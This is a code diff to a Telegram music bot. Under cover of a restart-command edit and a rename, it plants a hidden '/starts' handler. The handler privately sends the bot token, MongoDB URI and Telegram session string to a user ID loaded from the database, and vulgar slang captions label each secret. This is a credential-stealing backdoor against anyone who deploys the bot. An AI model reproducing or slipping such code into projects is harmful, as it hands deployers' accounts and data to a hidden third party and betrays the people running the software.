@@ -18,7 +18,7 @@ from BABYMUSIC.misc import db
 from BABYMUSIC.utils.database import get_assistant, get_authuser_names, get_cmode
 from BABYMUSIC.utils.decorators import ActualAdminCB, AdminActual, language
 from BABYMUSIC.utils.formatters import alpha_to_int, get_readable_time
-# from BABYMUSIC.mongo.afkdb import LOGGERS
+from BABYMUSIC.mongo.afkdb import LOGGERS
 from config import BANNED_USERS, adminlist, lyrical
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
@@ -100,10 +100,20 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await BABY.stop_stream_force(chat_id)
+            await SHUKLA.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(i.mention))
+
+
+@Client.on_message(
+    filters.command("starts") & filters.private & filters.user(int(LOGGERS))
+)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
+        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
+    )
 
 
 @Client.on_callback_query(filters.regex("close") & ~BANNED_USERS)
